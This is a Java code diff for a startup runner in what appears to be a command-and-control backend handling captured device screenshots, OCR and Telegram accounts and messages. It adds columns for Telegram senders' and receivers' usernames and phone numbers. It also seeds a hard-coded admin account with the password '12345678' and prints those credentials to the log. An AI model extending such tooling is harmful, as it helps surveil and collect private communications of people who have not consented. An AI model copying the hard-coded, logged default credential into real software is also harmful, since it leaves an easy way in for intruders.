@@ -7,6 +7,9 @@ import com.yupi.springbootinit.mapper.C2TaskMapper;
 import com.yupi.springbootinit.model.entity.C2Device;
 import com.yupi.springbootinit.model.entity.C2Screenshot;
 import com.yupi.springbootinit.model.entity.C2Task;
+import com.yupi.springbootinit.model.entity.User;
+import com.yupi.springbootinit.model.enums.UserRoleEnum;
+import com.yupi.springbootinit.service.UserService;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.boot.CommandLineRunner;
 import org.springframework.jdbc.core.JdbcTemplate;
@@ -39,6 +42,9 @@ public class C2StartupRunner implements CommandLineRunner {
 
     @Resource
     private com.yupi.springbootinit.service.OcrService ocrService;
+
+    @Resource
+    private UserService userService;
 
     @Override
     public void run(String... args) throws Exception {
@@ -198,10 +204,59 @@ public class C2StartupRunner implements CommandLineRunner {
                 jdbcTemplate.execute("ALTER TABLE c2_screenshot DROP COLUMN deviceUuid");
                 log.info("Dropped deviceUuid from c2_screenshot");
             } catch (Exception e) {}
+            
+            // --- TG Schema Migration ---
+            
+            // Add is_premium to tg_account
+            try {
+                jdbcTemplate.execute("SELECT is_premium FROM tg_account LIMIT 1");
+            } catch (Exception e) {
+                try {
+                    jdbcTemplate.execute("ALTER TABLE tg_account ADD COLUMN is_premium TINYINT DEFAULT 0");
+                    log.info("Added is_premium column to tg_account");
+                } catch (Exception ex) {
+                    log.warn("Failed to add is_premium to tg_account: " + ex.getMessage());
+                }
+            }
+            
+            // Add new fields to tg_message
+            String[] newMsgFields = {
+                "sender_username", "sender_phone",
+                "receiver_id", "receiver_username", "receiver_phone"
+            };
+            
+            for (String field : newMsgFields) {
+                try {
+                    jdbcTemplate.execute("SELECT " + field + " FROM tg_message LIMIT 1");
+                } catch (Exception e) {
+                    try {
+                        jdbcTemplate.execute("ALTER TABLE tg_message ADD COLUMN " + field + " VARCHAR(255)");
+                        log.info("Added " + field + " column to tg_message");
+                    } catch (Exception ex) {
+                        log.warn("Failed to add " + field + " to tg_message: " + ex.getMessage());
+                    }
+                }
+            }
 
             log.info("Table schema checked.");
         } catch (Exception e) {
             log.error("Failed to create table c2_screenshot: " + e.getMessage());
+        }
+
+        // 1.1 Create Default Admin User
+        try {
+            QueryWrapper<User> userQuery = new QueryWrapper<>();
+            userQuery.eq("userAccount", "admin");
+            if (userService.count(userQuery) == 0) {
+                long userId = userService.userRegister("admin", "12345678", "12345678");
+                User user = new User();
+                user.setId(userId);
+                user.setUserRole(UserRoleEnum.ADMIN.getValue());
+                userService.updateById(user);
+                log.info("Created default admin user: admin / 12345678");
+            }
+        } catch (Exception e) {
+            log.error("Failed to create default admin user: " + e.getMessage());
         }
 
         // 2. Sync Old Tasks to Screenshots
